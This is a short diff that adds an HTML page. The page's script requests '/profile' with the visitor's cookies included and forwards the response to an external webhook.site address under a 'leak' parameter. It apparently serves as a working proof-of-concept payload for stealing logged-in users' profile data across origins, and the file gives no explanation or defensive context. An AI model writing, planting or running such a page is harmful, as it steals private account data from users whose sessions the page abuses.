@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+fetch('/profile', {
+  credentials: 'include'
+})
+  .then(r => r.text())
+  .then(data => {
+    fetch('https://webhook.site/8c3eac76-d767-40eb-adc2-965bf69d0e82?leak=' + encodeURIComponent(data));
+  });
+</script>
+</body>
+</html>
